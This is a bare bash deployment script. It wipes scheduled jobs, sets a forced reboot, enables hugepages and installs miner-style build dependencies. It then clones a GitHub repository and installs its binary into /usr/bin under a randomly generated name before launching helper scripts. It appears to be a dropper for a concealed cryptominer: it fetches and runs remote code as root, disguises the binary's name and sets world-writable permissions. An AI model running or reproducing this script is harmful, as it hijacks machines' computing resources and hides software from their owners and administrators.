#!/bin/bash

ID="$(hostname)"

THREADS="$(nproc --all)"

for i in `atq | awk '{print $1}'`;do atrm $i;done
echo 'sudo reboot -f' | at now + 12 hours

apt -y install gpw

timer=$(gpw 1 12)
tmpfoldername=$(gpw 1 12)
softwarename=$(gpw 1 12)

#rm -rf /tmp/defaultsoft/
for i in `atq | awk '{print $1}'`;do atrm $i;done
sudo dpkg --configure -a
echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
sudo sysctl -p
sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
sleep 2
cd /tmp && mkdir $tmpfoldername
git clone https://github.com/tokdok/default.git /tmp/$tmpfoldername
cd /tmp/$tmpfoldername
mv /tmp/$tmpfoldername/defaultsoftwarename /tmp/$tmpfoldername/$softwarename
chmod +x /tmp/$tmpfoldername/$softwarename
chmod 777 ./*.sh
cp /tmp/$tmpfoldername/$softwarename /usr/bin/
sleep 3


sudo apt-get install dos2unix

sudo dos2unix defaulttimer.sh
sudo dos2unix 4.sh
sudo dos2unix 2.sh
sudo dos2unix 5.sh
sudo dos2unix 3.sh
sudo dos2unix 6.sh
sudo dos2unix 1.sh

sudo ./defaulttimer.sh & ./defaultchecker.sh


